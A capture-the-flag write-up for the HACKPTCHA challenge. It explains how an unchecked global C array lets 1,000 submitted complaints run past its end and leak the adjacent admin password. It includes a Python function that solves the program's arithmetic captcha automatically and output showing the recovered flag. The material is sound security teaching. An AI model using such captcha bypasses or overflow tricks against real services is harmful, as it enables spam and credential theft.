## HACKPTCHA [70]

**Tags**: array overflow, boundary checking, programming

**Description**: Recover the admin password for `shell.cyberstakesonline.com:56440`. Source and binary: [hackptcha.c](hackptcha.c), [hackptcha](hackptcha)

## Solution
Like any helpful help desk, your complaints are initially routed to `/dev/null` :) :) :)
```C
	complaints_file = "/dev/null";
```

The flag is read into the global variable `admin_password` from `./flag`:
```C
	FILE *flag = fopen("./flag", "r");
	admin_password = fgets(malloc(100), 100, flag);
	fclose(flag);
```

The array of complaint strings, the complaints filename, and the admin password variables are all stored contiguously in global memory. The order is very important:
```C
const char *complaints[999] = {NULL};
const char *complaints_file = NULL;
const char *admin_password = NULL;
```

The `complaints[]` array is defined as 999 items in length. However, by examining the `complain()` function, we can see that there is no enforcing that size. It simply iterates forward until a `NULL` pointer is reached:
```
void complain() {
	const char **complaint = complaints;
	int counter = 0;
	while(*complaint != NULL) {
		complaint++;
		counter++;
	}
	if(counter > 10)
		captcha();
	printf("> ");
	*complaint = fgets(malloc(100), 100, stdin);
}
```

This means that once we have entered 1,000 complaints (complaints 0-999), the 1,001st complaint will cause `complain()` to skip *over* `complaints_file` and `admin_password` in memory and stick the next complaint contiguously after `admin_password`. The function `dump()` iterates over `complaints[]` in the same way, printing out strings until it encounters a `NULL` pointer. If we are able to completely fill up the `complaints[]` array and then dump strings, it will print out `complaints_file` and `admin_password` as well since they are *not* `NULL` pointers.

Armed with this knowledge, we need to find a *smart* way to lodge 1,000 complaints. However, we can see that after the 11th complaint (complaint #10), the user is forced to validate a "captcha" before each complaint to discourage spamming:
```C
void captcha() {
	const char ops[] = {'+', '-', '*'};
	int a = rand() % 100;
	int b = rand() % 100;
	int c = rand() % 100;
	char o1 = ops[rand() % 3];
	char o2 = ops[rand() % 3];
	printf("Captcha: %d %c %d %c %d = ", a, o1, b, o2, c);

	char *response = fgets(malloc(100), 100, stdin);

	int result = a;
	switch(o1) {
		case '+': result += b; break;
		case '-': result -= b; break;
		case '*': result *= b; break;
	}
	switch(o2) {
		case '+': result += c; break;
		case '-': result -= c; break;
		case '*': result *= c; break;
	}
	
	if(result != atoi(response)) {
		puts("No automated complaints!");
		exit(0);
	}
	free(response);
}
```

The captcha is in the form:
```
Captcha: 83 - 86 * 77 =
```

We can write a Python function to solve captchas automatically:
```Python
def SolveCaptcha(cap):
  splitcap = cap.split(' ')
  
  a = int(splitcap[1])
  b = int(splitcap[3])
  c = int(splitcap[5])

  op1 = splitcap[2]
  op2 = splitcap[4]

  res = 0

  if op1 == '+':
    res = a + b
  elif op1 == '-':
    res = a - b
  else:
    res = a * b

  if op2 == '+':
    res = res + c
  elif op2 == '-':
    res = res - c
  else:
    res = res * c

  return str(res)
```

See [solve.py](solve.py) for a full solution. After lodging all 1,000 complaints and switching to `pwnlib`'s interactive mode, we can print out all of the complaints. At the very end of the output, we can see `complaints_file` (`/dev/null`) and `admin_password` (`b262a5c0490c514a0c0235f1ac69712f`):
```
[...]
Captcha: 65 - 95 - 27 = -57
Captcha: 2 - 89 + 5 = -82
Captcha: 86 - 10 + 28 = 104
[*] Switching to interactive mode
$ r
asdf
asdf
asdf
[...]
asdf
asdf
asdf
/dev/nullb262a5c0490c514a0c0235f1ac69712fasdf
asdf

[w]rite a complaint
[r]eview your complaints
[q]uit
> $
```